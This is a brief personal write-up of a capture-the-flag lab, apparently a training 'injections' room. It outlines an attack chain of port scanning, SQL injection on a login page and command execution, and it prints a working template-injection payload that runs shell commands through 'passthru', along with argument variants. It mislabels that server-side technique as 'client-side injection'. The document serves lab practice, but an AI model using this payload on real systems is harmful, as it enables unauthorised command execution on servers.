**attack pattern**
nmap > creds via hidden dirs > 1st flag via sqli on login-page > admin access via sqli again > limited RCE to read 2nd flag via client-side injection 

**payload to read 2nd flag**
*Command worked on **injections** room to gain limited RCE*
{{['id',1]|sort('passthru')|join}}

*sidenote* : 'system' didnt work but changing it to 'passthru' did for some reason?? 

payload above could also be:
['id','abc']
['id',0]
['id','zzz']

